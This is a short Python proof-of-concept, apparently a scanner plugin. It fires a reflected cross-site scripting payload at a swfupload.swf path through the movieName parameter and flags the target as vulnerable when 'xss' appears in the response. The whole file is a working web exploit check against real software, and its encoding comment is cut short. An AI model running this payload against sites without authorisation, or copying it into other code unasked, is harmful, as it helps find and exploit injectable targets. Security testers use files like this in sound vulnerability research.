# coding:utf-
import requests
import re

class Exploit:

    payload = '/statics/js/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss%22%29}}//'

    def attack(self, url):
        response = requests.get(url+self.payload)

        if response.status_code == 200:
            if re.search(r'xss', response.text):
                return '{} has XSS'.format(url+self.payload)
